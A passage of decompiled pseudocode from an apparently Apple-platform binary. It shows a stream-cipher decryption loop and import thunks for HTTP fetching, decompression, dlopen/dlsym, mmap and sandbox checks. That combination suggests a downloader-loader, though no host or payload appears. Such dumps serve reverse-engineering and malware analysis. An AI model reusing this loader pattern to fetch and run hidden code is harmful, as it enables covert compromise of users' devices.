          LODWORD(v23) = v37 ^ __ROR4__(v34, 20);
          v38 = v23;
          HIDWORD(v23) = v23;
          v39 = v23 >> 25;
          v40 = v15 + v13;
          v41 = v18 ^ v40;
          HIDWORD(v23) = v41;
          LODWORD(v23) = v41;
          v42 = (v23 >> 16) + v20;
          v43 = v42 ^ v13;
          HIDWORD(v23) = v43;
          LODWORD(v23) = v43;
          v44 = (v23 >> 20) + v40;
          LODWORD(v23) = v44 ^ __ROR4__(v41, 16);
          v45 = v23;
          HIDWORD(v23) = v23;
          v46 = (v23 >> 24) + v42;
          LODWORD(v23) = v46 ^ __ROR4__(v43, 20);
          v47 = v23;
          HIDWORD(v23) = v23;
          v48 = v23 >> 25;
          v49 = v16 + v14;
          v50 = v17 ^ v49;
          HIDWORD(v23) = v50;
          LODWORD(v23) = v50;
          v51 = (v23 >> 16) + result;
          v52 = v51 ^ v14;
          HIDWORD(v23) = v52;
          LODWORD(v23) = v52;
          v53 = (v23 >> 20) + v49;
          LODWORD(v23) = v53 ^ __ROR4__(v50, 16);
          v54 = v23;
          HIDWORD(v23) = v23;
          v55 = (v23 >> 24) + v51;
          LODWORD(v23) = v55 ^ __ROR4__(v52, 20);
          v56 = v23;
          HIDWORD(v23) = v23;
          v57 = v23 >> 25;
          v58 = v39 + v26;
          LODWORD(v23) = v58 ^ __ROR4__(v54, 24);
          v59 = v23;
          HIDWORD(v23) = v23;
          v60 = (v23 >> 16) + v46;
          LODWORD(v23) = v60 ^ __ROR4__(v38, 25);
          v61 = v23;
          HIDWORD(v23) = v23;
          v7 = (v23 >> 20) + v58;
          LODWORD(v23) = v7 ^ __ROR4__(v59, 16);
          HIDWORD(v23) = v23;
          v17 = v23 >> 24;
          v20 = v17 + v60;
          LODWORD(v23) = v20 ^ __ROR4__(v61, 20);
          HIDWORD(v23) = v23;
          v5 = v23 >> 25;
          v62 = v48 + v35;
          LODWORD(v23) = v62 ^ __ROR4__(v27, 24);
          v63 = v23;
          HIDWORD(v23) = v23;
          v64 = (v23 >> 16) + v55;
          LODWORD(v23) = v64 ^ __ROR4__(v47, 25);
          v65 = v23;
          HIDWORD(v23) = v23;
          v8 = (v23 >> 20) + v62;
          LODWORD(v23) = v8 ^ __ROR4__(v63, 16);
          HIDWORD(v23) = v23;
          v9 = v23 >> 24;
          result = v9 + v64;
          LODWORD(v23) = result ^ __ROR4__(v65, 20);
          HIDWORD(v23) = v23;
          v13 = v23 >> 25;
          v66 = v57 + v44;
          LODWORD(v23) = v66 ^ __ROR4__(v36, 24);
          v67 = v23;
          HIDWORD(v23) = v23;
          v68 = (v23 >> 16) + v28;
          LODWORD(v23) = v68 ^ __ROR4__(v56, 25);
          v69 = v23;
          HIDWORD(v23) = v23;
          v15 = (v23 >> 20) + v66;
          LODWORD(v23) = v15 ^ __ROR4__(v67, 16);
          HIDWORD(v23) = v23;
          v10 = v23 >> 24;
          v11 = v10 + v68;
          LODWORD(v23) = v11 ^ __ROR4__(v69, 20);
          HIDWORD(v23) = v23;
          v14 = v23 >> 25;
          v70 = v53 + v30;
          LODWORD(v23) = v70 ^ __ROR4__(v45, 24);
          v71 = v23;
          HIDWORD(v23) = v23;
          v72 = (v23 >> 16) + v37;
          LODWORD(v23) = v72 ^ __ROR4__(v29, 25);
          v73 = v23;
          HIDWORD(v23) = v23;
          v16 = (v23 >> 20) + v70;
          LODWORD(v23) = v16 ^ __ROR4__(v71, 16);
          HIDWORD(v23) = v23;
          v18 = v23 >> 24;
          v12 = v18 + v72;
          LODWORD(v23) = v12 ^ __ROR4__(v73, 20);
          HIDWORD(v23) = v23;
          v6 = v23 >> 25;
          --v19;
        }
        while ( v19 );
        v74 = 0;
        *(_QWORD *)&v79 = __PAIR64__(v5, v6);
        *(_QWORD *)&v81 = __PAIR64__(v10, v9);
        *(_QWORD *)&v80 = __PAIR64__(v12, v11);
        *((_QWORD *)&v79 + 1) = __PAIR64__(v14, v13);
        *((_QWORD *)&v81 + 1) = __PAIR64__(v17, v18);
        *((_QWORD *)&v80 + 1) = __PAIR64__(result, v20);
        v75 = (unsigned __int8)(v82 + v7);
        LODWORD(v78) = v82 + v7;
        DWORD1(v78) = DWORD1(v82) + v8;
        DWORD2(v78) = DWORD2(v82) + v15;
        HIDWORD(v78) = v16;
        do
        {
          *(_DWORD *)((char *)&v78 + v74 + 12) += *(_DWORD *)&v83[v74 - 4];
          v74 += 4;
        }
        while ( v74 != 52 );
        v76 = __CFADD__((_DWORD)v84, 1);
        LODWORD(v84) = v84 + 1;
        v4 = 0;
        if ( v76 )
          ++DWORD1(v84);
      }
      *(_BYTE *)(a2 + v3) ^= v75;
      v77 = ++v4;
      ++v3;
    }
    while ( v3 != a3 );
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B0F8
// Address:  0xB0F8  Size: 4 bytes
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_B0F8(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_B0FC(a1, a2, a3);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B0FC
// Address:  0xB0FC  Size: 96 bytes
// Calls:    sub_B15C
// Xrefs:    109 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_B0FC()
{
  __int64 (*v0)(void); // x10

  if ( &dword_0 )
  {
    sub_B15C(v0, 0);
    JUMPOUT(0);
  }
  return v0();
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B15C
// Address:  0xB15C  Size: 60 bytes
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

void sub_B15C()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B198
// Address:  0xB198  Size: 60 bytes
////////////////////////////////////////////////////////////////////////

void sub_B198()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B1D4
// Address:  0xB1D4  Size: 60 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_B1D4()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_B210
// Address:  0xB210  Size: 80 bytes
////////////////////////////////////////////////////////////////////////

void sub_B210()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: _CFDataCreate
// Address:  0xB280  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFDataRef __cdecl CFDataCreate(CFAllocatorRef allocator, const UInt8 *bytes, CFIndex length)
{
  return _CFDataCreate(allocator, bytes, length);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFDataGetBytePtr
// Address:  0xB28C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
const UInt8 *__cdecl CFDataGetBytePtr(CFDataRef theData)
{
  return _CFDataGetBytePtr(theData);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFDataGetLength
// Address:  0xB298  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFIndex __cdecl CFDataGetLength(CFDataRef theData)
{
  return _CFDataGetLength(theData);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFDictionaryCreate
// Address:  0xB2A4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFDictionaryRef __cdecl CFDictionaryCreate(
        CFAllocatorRef allocator,
        const void **keys,
        const void **values,
        CFIndex numValues,
        const CFDictionaryKeyCallBacks *keyCallBacks,
        const CFDictionaryValueCallBacks *valueCallBacks)
{
  return _CFDictionaryCreate(allocator, keys, values, numValues, keyCallBacks, valueCallBacks);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFDictionaryGetValue
// Address:  0xB2B0  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
const void *__cdecl CFDictionaryGetValue(CFDictionaryRef theDict, const void *key)
{
  return _CFDictionaryGetValue(theDict, key);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFEqual
// Address:  0xB2BC  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFEqual(CFTypeRef cf1, CFTypeRef cf2)
{
  return _CFEqual(cf1, cf2);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFGetTypeID
// Address:  0xB2C8  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFTypeID __cdecl CFGetTypeID(CFTypeRef cf)
{
  return _CFGetTypeID(cf);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageAppendBytes
// Address:  0xB2D4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFHTTPMessageAppendBytes(CFHTTPMessageRef message, const UInt8 *newBytes, CFIndex numBytes)
{
  return _CFHTTPMessageAppendBytes(message, newBytes, numBytes);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageCopyBody
// Address:  0xB2E0  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFDataRef __cdecl CFHTTPMessageCopyBody(CFHTTPMessageRef message)
{
  return _CFHTTPMessageCopyBody(message);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageCreateEmpty
// Address:  0xB2EC  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFHTTPMessageRef __cdecl CFHTTPMessageCreateEmpty(CFAllocatorRef alloc, Boolean isRequest)
{
  return _CFHTTPMessageCreateEmpty(alloc, isRequest);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageCreateRequest
// Address:  0xB2F8  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFHTTPMessageRef __cdecl CFHTTPMessageCreateRequest(
        CFAllocatorRef alloc,
        CFStringRef requestMethod,
        CFURLRef url,
        CFStringRef httpVersion)
{
  return _CFHTTPMessageCreateRequest(alloc, requestMethod, url, httpVersion);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageGetResponseStatusCode
// Address:  0xB304  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFIndex __cdecl CFHTTPMessageGetResponseStatusCode(CFHTTPMessageRef response)
{
  return _CFHTTPMessageGetResponseStatusCode(response);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageSetBody
// Address:  0xB310  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFHTTPMessageSetBody(CFHTTPMessageRef message, CFDataRef bodyData)
{
  _CFHTTPMessageSetBody(message, bodyData);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFHTTPMessageSetHeaderFieldValue
// Address:  0xB31C  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFHTTPMessageSetHeaderFieldValue(CFHTTPMessageRef message, CFStringRef headerField, CFStringRef value)
{
  _CFHTTPMessageSetHeaderFieldValue(message, headerField, value);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFPropertyListCreateWithStream
// Address:  0xB328  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFPropertyListRef __cdecl CFPropertyListCreateWithStream(
        CFAllocatorRef allocator,
        CFReadStreamRef stream,
        CFIndex streamLength,
        CFOptionFlags options,
        CFPropertyListFormat *format,
        CFErrorRef *error)
{
  return _CFPropertyListCreateWithStream(allocator, stream, streamLength, options, format, error);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamClose
// Address:  0xB334  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFReadStreamClose(CFReadStreamRef stream)
{
  _CFReadStreamClose(stream);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamCopyProperty
// Address:  0xB340  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFTypeRef __cdecl CFReadStreamCopyProperty(CFReadStreamRef stream, CFStreamPropertyKey propertyName)
{
  return _CFReadStreamCopyProperty(stream, propertyName);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamCreateForHTTPRequest
// Address:  0xB34C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFReadStreamRef __cdecl CFReadStreamCreateForHTTPRequest(CFAllocatorRef alloc, CFHTTPMessageRef request)
{
  return _CFReadStreamCreateForHTTPRequest(alloc, request);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamCreateWithFile
// Address:  0xB358  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFReadStreamRef __cdecl CFReadStreamCreateWithFile(CFAllocatorRef alloc, CFURLRef fileURL)
{
  return _CFReadStreamCreateWithFile(alloc, fileURL);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamOpen
// Address:  0xB364  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFReadStreamOpen(CFReadStreamRef stream)
{
  return _CFReadStreamOpen(stream);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamRead
// Address:  0xB370  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFIndex __cdecl CFReadStreamRead(CFReadStreamRef stream, UInt8 *buffer, CFIndex bufferLength)
{
  return _CFReadStreamRead(stream, buffer, bufferLength);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamScheduleWithRunLoop
// Address:  0xB37C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFReadStreamScheduleWithRunLoop(CFReadStreamRef stream, CFRunLoopRef runLoop, CFRunLoopMode runLoopMode)
{
  _CFReadStreamScheduleWithRunLoop(stream, runLoop, runLoopMode);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamSetClient
// Address:  0xB388  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFReadStreamSetClient(
        CFReadStreamRef stream,
        CFOptionFlags streamEvents,
        CFReadStreamClientCallBack clientCB,
        CFStreamClientContext *clientContext)
{
  return _CFReadStreamSetClient(stream, streamEvents, clientCB, clientContext);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFReadStreamSetProperty
// Address:  0xB394  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFReadStreamSetProperty(
        CFReadStreamRef stream,
        CFStreamPropertyKey propertyName,
        CFTypeRef propertyValue)
{
  return _CFReadStreamSetProperty(stream, propertyName, propertyValue);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFRelease
// Address:  0xB3A0  Size: 12 bytes
// Xrefs:    30 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFRelease(CFTypeRef cf)
{
  _CFRelease(cf);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFRunLoopGetCurrent
// Address:  0xB3AC  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFRunLoopRef CFRunLoopGetCurrent(void)
{
  return _CFRunLoopGetCurrent();
}


////////////////////////////////////////////////////////////////////////
// Function: _CFRunLoopRunInMode
// Address:  0xB3B8  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFRunLoopRunResult __cdecl CFRunLoopRunInMode(
        CFRunLoopMode mode,
        CFTimeInterval seconds,
        Boolean returnAfterSourceHandled)
{
  return _CFRunLoopRunInMode(mode, seconds, returnAfterSourceHandled);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFRunLoopStop
// Address:  0xB3C4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl CFRunLoopStop(CFRunLoopRef rl)
{
  _CFRunLoopStop(rl);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFStringCreateWithCString
// Address:  0xB3D0  Size: 12 bytes
// Xrefs:    9 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFStringRef __cdecl CFStringCreateWithCString(CFAllocatorRef alloc, const char *cStr, CFStringEncoding encoding)
{
  return _CFStringCreateWithCString(alloc, cStr, encoding);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFStringGetCString
// Address:  0xB3DC  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
Boolean __cdecl CFStringGetCString(CFStringRef theString, char *buffer, CFIndex bufferSize, CFStringEncoding encoding)
{
  return _CFStringGetCString(theString, buffer, bufferSize, encoding);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFStringGetLength
// Address:  0xB3E8  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFIndex __cdecl CFStringGetLength(CFStringRef theString)
{
  return _CFStringGetLength(theString);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFStringGetSystemEncoding
// Address:  0xB3F4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFStringEncoding CFStringGetSystemEncoding(void)
{
  return _CFStringGetSystemEncoding();
}


////////////////////////////////////////////////////////////////////////
// Function: _CFStringGetTypeID
// Address:  0xB400  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFTypeID CFStringGetTypeID(void)
{
  return _CFStringGetTypeID();
}


////////////////////////////////////////////////////////////////////////
// Function: _CFURLCopyScheme
// Address:  0xB40C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFStringRef __cdecl CFURLCopyScheme(CFURLRef anURL)
{
  return _CFURLCopyScheme(anURL);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFURLCreateFromFileSystemRepresentation
// Address:  0xB418  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFURLRef __cdecl CFURLCreateFromFileSystemRepresentation(
        CFAllocatorRef allocator,
        const UInt8 *buffer,
        CFIndex bufLen,
        Boolean isDirectory)
{
  return _CFURLCreateFromFileSystemRepresentation(allocator, buffer, bufLen, isDirectory);
}


////////////////////////////////////////////////////////////////////////
// Function: _CFURLCreateWithString
// Address:  0xB424  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFURLRef __cdecl CFURLCreateWithString(CFAllocatorRef allocator, CFStringRef URLString, CFURLRef baseURL)
{
  return _CFURLCreateWithString(allocator, URLString, baseURL);
}


////////////////////////////////////////////////////////////////////////
// Function: _SCDynamicStoreCopyProxies
// Address:  0xB430  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
CFDictionaryRef __cdecl SCDynamicStoreCopyProxies(SCDynamicStoreRef store)
{
  return _SCDynamicStoreCopyProxies(store);
}


////////////////////////////////////////////////////////////////////////
// Function: __Block_object_assign
// Address:  0xB43C  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl _Block_object_assign(void *a1, const void *a2, const int a3)
{
  __Block_object_assign(a1, a2, a3);
}


////////////////////////////////////////////////////////////////////////
// Function: __Block_object_dispose
// Address:  0xB448  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl _Block_object_dispose(const void *a1, const int a2)
{
  __Block_object_dispose(a1, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: ___error
// Address:  0xB454  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int *__error(void)
{
  return ___error();
}


////////////////////////////////////////////////////////////////////////
// Function: _abort
// Address:  0xB460  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __noreturn abort(void)
{
  _abort();
}


////////////////////////////////////////////////////////////////////////
// Function: _bzero
// Address:  0xB46C  Size: 12 bytes
// Xrefs:    14 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl bzero(void *a1, size_t a2)
{
  _bzero(a1, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: _calloc
// Address:  0xB478  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl calloc(size_t __count, size_t __size)
{
  return _calloc(__count, __size);
}


////////////////////////////////////////////////////////////////////////
// Function: _compression_decode_buffer
// Address:  0xB484  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
size_t __cdecl compression_decode_buffer(
        uint8_t *dst_buffer,
        size_t dst_size,
        const uint8_t *src_buffer,
        size_t src_size,
        void *scratch_buffer,
        compression_algorithm algorithm)
{
  return _compression_decode_buffer(dst_buffer, dst_size, src_buffer, src_size, scratch_buffer, algorithm);
}


////////////////////////////////////////////////////////////////////////
// Function: _dlclose
// Address:  0xB490  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl dlclose(void *__handle)
{
  return _dlclose(__handle);
}


////////////////////////////////////////////////////////////////////////
// Function: _dlopen
// Address:  0xB49C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl dlopen(const char *__path, int __mode)
{
  return _dlopen(__path, __mode);
}


////////////////////////////////////////////////////////////////////////
// Function: _dlsym
// Address:  0xB4A8  Size: 12 bytes
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl dlsym(void *__handle, const char *__symbol)
{
  return _dlsym(__handle, __symbol);
}


////////////////////////////////////////////////////////////////////////
// Function: _exit
// Address:  0xB4B4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl __noreturn exit(int a1)
{
  _exit(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _free
// Address:  0xB4C0  Size: 12 bytes
// Xrefs:    15 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void __cdecl free(void *a1)
{
  _free(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _getpid
// Address:  0xB4CC  Size: 12 bytes
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
pid_t getpid(void)
{
  return _getpid();
}


////////////////////////////////////////////////////////////////////////
// Function: _host_info
// Address:  0xB4D8  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl host_info(
        host_t host,
        host_flavor_t flavor,
        host_info_t host_info_out,
        mach_msg_type_number_t *host_info_outCnt)
{
  return _host_info(host, flavor, host_info_out, host_info_outCnt);
}


////////////////////////////////////////////////////////////////////////
// Function: _host_kernel_version
// Address:  0xB4E4  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl host_kernel_version(host_t host, kernel_version_t kernel_version)
{
  return _host_kernel_version(host, kernel_version);
}


////////////////////////////////////////////////////////////////////////
// Function: _mach_host_self
// Address:  0xB4F0  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
mach_port_t mach_host_self(void)
{
  return _mach_host_self();
}


////////////////////////////////////////////////////////////////////////
// Function: _malloc
// Address:  0xB4FC  Size: 12 bytes
// Xrefs:    8 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl malloc(size_t __size)
{
  return _malloc(__size);
}


////////////////////////////////////////////////////////////////////////
// Function: _memcpy
// Address:  0xB508  Size: 12 bytes
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl memcpy(void *__dst, const void *__src, size_t __n)
{
  return _memcpy(__dst, __src, __n);
}


////////////////////////////////////////////////////////////////////////
// Function: _memset_s
// Address:  0xB514  Size: 12 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
errno_t __cdecl memset_s(void *__s, rsize_t __smax, int __c, rsize_t __n)
{
  return _memset_s(__s, __smax, __c, __n);
}


////////////////////////////////////////////////////////////////////////
// Function: _mmap
// Address:  0xB520  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
void *__cdecl mmap(void *a1, size_t a2, int a3, int a4, int a5, off_t a6)
{
  return _mmap(a1, a2, a3, a4, a5, a6);
}


////////////////////////////////////////////////////////////////////////
// Function: _objc_alloc
// Address:  0xB52C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
id __cdecl objc_alloc(Class a1)
{
  return _objc_alloc(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _proc_pidinfo
// Address:  0xB538  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize)
{
  return _proc_pidinfo(pid, flavor, arg, buffer, buffersize);
}


////////////////////////////////////////////////////////////////////////
// Function: _pthread_attr_destroy
// Address:  0xB544  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl pthread_attr_destroy(pthread_attr_t *a1)
{
  return _pthread_attr_destroy(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _pthread_attr_init
// Address:  0xB550  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl pthread_attr_init(pthread_attr_t *a1)
{
  return _pthread_attr_init(a1);
}


////////////////////////////////////////////////////////////////////////
// Function: _pthread_attr_setdetachstate
// Address:  0xB55C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl pthread_attr_setdetachstate(pthread_attr_t *a1, int a2)
{
  return _pthread_attr_setdetachstate(a1, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: _pthread_create
// Address:  0xB568  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl pthread_create(pthread_t *a1, const pthread_attr_t *a2, void *(__cdecl *a3)(void *), void *a4)
{
  return _pthread_create(a1, a2, a3, a4);
}


////////////////////////////////////////////////////////////////////////
// Function: _sandbox_check
// Address:  0xB574  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
__int64 __fastcall sandbox_check()
{
  return _sandbox_check();
}


////////////////////////////////////////////////////////////////////////
// Function: _semaphore_create
// Address:  0xB580  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl semaphore_create(task_t task, semaphore_t *semaphore, int policy, int value)
{
  return _semaphore_create(task, semaphore, policy, value);
}


////////////////////////////////////////////////////////////////////////
// Function: _semaphore_signal
// Address:  0xB58C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl semaphore_signal(semaphore_t semaphore)
{
  return _semaphore_signal(semaphore);
}


////////////////////////////////////////////////////////////////////////
// Function: _semaphore_wait
// Address:  0xB598  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
kern_return_t __cdecl semaphore_wait(semaphore_t semaphore)
{
  return _semaphore_wait(semaphore);
}


////////////////////////////////////////////////////////////////////////
// Function: _sigaction
// Address:  0xB5A4  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl sigaction(int a1, const sigaction *a2, sigaction *a3)
{
  return _sigaction(a1, a2, a3);
}


////////////////////////////////////////////////////////////////////////
// Function: _snprintf
// Address:  0xB5B0  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int snprintf(char *__str, size_t __size, const char *__format, ...)
{
  return _snprintf(__str, __size, __format);
}


////////////////////////////////////////////////////////////////////////
// Function: _sscanf
// Address:  0xB5BC  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int sscanf(const char *a1, const char *a2, ...)
{
  return _sscanf(a1, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: _stat
// Address:  0xB5C8  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
int __cdecl stat(const char *a1, stat *a2)
{
  return _stat(a1, a2);
}


////////////////////////////////////////////////////////////////////////
// Function: _strchr
// Address:  0xB5D4  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
char *__cdecl strchr(const char *__s, int __c)
{
  return _strchr(__s, __c);
}


////////////////////////////////////////////////////////////////////////
// Function: _strdup
// Address:  0xB5E0  Size: 12 bytes
// Xrefs:    6 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
char *__cdecl strdup(const char *__s1)
{
  return _strdup(__s1);
}


////////////////////////////////////////////////////////////////////////
// Function: _strlcat
// Address:  0xB5EC  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

// attributes: thunk
